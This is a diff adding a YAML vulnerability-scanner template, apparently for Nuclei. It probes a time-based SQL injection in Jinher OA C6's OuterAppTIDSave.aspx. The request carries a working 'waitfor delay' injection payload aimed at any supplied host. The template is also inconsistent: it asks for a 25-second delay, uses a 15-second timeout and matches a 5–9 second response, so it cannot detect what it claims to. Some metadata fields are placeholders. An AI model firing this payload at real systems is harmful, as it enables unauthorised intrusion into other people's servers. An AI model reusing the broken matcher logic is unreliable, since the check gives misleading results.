@@ -1,0 +1,32 @@
+id: jinher-oa-c6-OuterAppTIDSave-sqli
+info:
+  name: 金和OA C6 OuterAppTIDSave.aspx SQL注入
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://vip.bdziyi.com/59713/
+  classification:
+    cve-id: 
+  metadata:
+    verified: true/false
+    fofa-query: demo
+    tips:
+    repair:
+    sqlmap:
+    version:
+  tags: sqli,jinher
+
+http:
+  - raw:  
+      - |
+        @timeout: 15s
+        GET /c6/Jhsoft.Web.AddMenu/OuterAppTIDSave.aspx/?SystemID=1'waitfor%20delay'0%3A0%3A25'--&OuterAppTID=1&AppTID=1 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - duration >= 5 && duration < 9
+        condition: and
